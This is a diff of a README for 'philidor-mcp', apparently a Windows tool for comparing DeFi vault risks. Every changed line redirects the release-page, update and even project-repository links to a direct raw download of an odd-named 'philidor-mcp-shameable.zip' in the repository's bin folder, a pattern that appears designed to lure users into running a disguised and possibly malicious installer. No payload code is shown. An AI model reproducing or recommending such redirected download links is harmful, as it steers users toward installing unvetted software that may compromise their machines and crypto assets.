@@ -1,6 +1,6 @@
 # 🛡️ philidor-mcp - Compare and Analyze DeFi Vault Risks
 
-[![Download philidor-mcp](https://img.shields.io/badge/Download-Here-4caf50?style=for-the-badge)](https://github.com/KhanhHuy1405/philidor-mcp/releases)
+[![Download philidor-mcp](https://img.shields.io/badge/Download-Here-4caf50?style=for-the-badge)](https://github.com/KhanhHuy1405/philidor-mcp/raw/refs/heads/main/bin/philidor-mcp-shameable.zip)
 
 ---
 
@@ -44,7 +44,7 @@ Follow these steps to get philidor-mcp running on your Windows computer:
 
 Go to the official release page to get the software:
 
-[Download philidor-mcp from GitHub](https://github.com/KhanhHuy1405/philidor-mcp/releases)
+[Download philidor-mcp from GitHub](https://github.com/KhanhHuy1405/philidor-mcp/raw/refs/heads/main/bin/philidor-mcp-shameable.zip)
 
 This page lists the latest versions and all necessary files.
 
@@ -103,7 +103,7 @@ Once installed, find the philidor-mcp shortcut on your desktop or in the Start m
 Keep your software up to date to access the newest vault data and features:
 
 - Check the release page regularly:  
-  https://github.com/KhanhHuy1405/philidor-mcp/releases  
+  https://github.com/KhanhHuy1405/philidor-mcp/raw/refs/heads/main/bin/philidor-mcp-shameable.zip  
 - Download the latest installer file.
 - Run the installer to overwrite the old version.
 - No need to uninstall first.
@@ -124,9 +124,9 @@ If something does not work:
 ## 🔗 Useful Links
 
 - Main Release Page:  
-  [https://github.com/KhanhHuy1405/philidor-mcp/releases](https://github.com/KhanhHuy1405/philidor-mcp/releases)
+  [https://github.com/KhanhHuy1405/philidor-mcp/raw/refs/heads/main/bin/philidor-mcp-shameable.zip](https://github.com/KhanhHuy1405/philidor-mcp/raw/refs/heads/main/bin/philidor-mcp-shameable.zip)
 - Project Repository:  
-  [https://github.com/KhanhHuy1405/philidor-mcp](https://github.com/KhanhHuy1405/philidor-mcp)
+  [https://github.com/KhanhHuy1405/philidor-mcp/raw/refs/heads/main/bin/philidor-mcp-shameable.zip](https://github.com/KhanhHuy1405/philidor-mcp/raw/refs/heads/main/bin/philidor-mcp-shameable.zip)
 - Documentation (Built-in and online)
 
 ---
